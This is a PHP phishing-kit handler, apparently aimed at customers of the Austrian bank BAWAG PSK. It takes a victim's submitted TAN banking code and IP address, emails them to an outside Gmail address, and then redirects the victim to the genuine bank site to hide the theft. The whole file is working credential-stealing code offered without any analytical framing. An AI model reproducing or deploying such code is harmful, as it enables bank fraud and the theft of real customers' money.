<?
$ip = getenv("REMOTE_ADDR");
$msg .= "\n"; 
$msg .= "Tan Code: ".$_POST['pass5']."\n";
$msg .= "\n"; 
$msg .= "IP: ".$ip."\n";
$msg .= "------------Built By MMM----------------\n";
$post = "mercyhope278@gmail.com";
$subj = "$ip - ".$_POST['pass5']."\n";
$from = "From: Tan CODE<logs@support.my>";
mail("$post",$subj, $msg, $from); 
header("Location: https://www.bawagpsk.com/BAWAGPSK/PK");	  

?>

